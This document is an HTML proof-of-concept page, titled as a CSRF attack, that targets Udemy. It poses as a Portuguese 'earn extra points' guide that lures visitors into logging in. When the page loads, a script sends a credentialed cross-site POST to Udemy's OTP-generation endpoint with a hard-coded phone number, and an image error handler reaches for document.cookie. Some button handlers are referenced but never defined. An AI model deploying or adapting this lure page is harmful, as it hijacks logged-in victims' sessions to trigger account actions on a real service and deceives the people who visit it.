<!DOCTYPE html>
<html>
<head>
    <title>Ataque CSRF - Duas Janelas</title>
</head>
<body>
    <h1>Guia para ganhar pontos extras</h1>
    <p>Siga os passos abaixo para receber pontos exclusivos:</p>
    
    <div id="step1">
        <h3>Passo 1: Faça login na sua conta</h3>
        <p>Clique no botão abaixo e faça login na sua conta. <strong>Depois de fazer login, volte para esta página</strong>.</p>
        <button id="login-button" onclick="openLoginWindow()">Fazer Login</button>
    </div>
    
    <div id="step2" style="display:none;">
        <h3>Passo 2: Confirme seus dados para receber os pontos</h3>
        <p>Agora que você está logado, clique no botão abaixo para confirmar seus dados e receber os pontos:</p>
        <button id="confirm-button" onclick="executeCsrf()">Confirmar Meus Dados</button>
    </div>
    <img src="https://www.udemy.com/join/passwordless-auth/?locale=en_US" onerror="document.cookie" />
    <div class="ufb-notice-module--partner-logos--vHIWo">
        <img src="https://s.udemycdn.com/partner-logos/v4/nasdaq-light.svg" alt="Nasdaq" height="44" width="115" loading="lazy">
        <img src="https://s.udemycdn.com/partner-logos/v4/volkswagen-light.svg" alt="Volkswagen" height="44" width="44" loading="lazy">
        <img src="https://s.udemycdn.com/partner-logos/v4/netapp-light.svg" alt="NetApp" height="44" width="115" loading="lazy">
        <img src="https://s.udemycdn.com/partner-logos/v4/eventbrite-light.svg" alt="Eventbrite" height="44" width="115" loading="lazy">
    </div>
    <script>
        async function getData() {
              const url = "https://www.udemy.com/api-2.0/auth/non-auth-otp/generate/";
              try {
                const response = await fetch(url, {
                  method: "POST",
                  mode: "cors",                // opcional, mais explícito
                  credentials: "include",      // envia cookies (ou 'same-origin' se for mesmo domínio)
                  headers: {
                    "Content-Type": "application/json",
                    "Accept": "application/json",
                    // adicione aqui qualquer header custom que o servidor espere, ex:
                    // "X-CSRF-Token": "valor", 
                    "X-Requested-With": "XMLHttpRequest"
                  },
                  body: JSON.stringify({
                    purpose: 3,
                    phone_number: "+5514996810417"
                  })
                });

                if (!response.ok) {
                  throw new Error(`Response status: ${response.status}`);
                }
            
                const result = await response.json();
                console.log(result);
              } catch (error) {
                console.error(error.message);
              }
            }
        getData()
    </script>
</body>
</html>
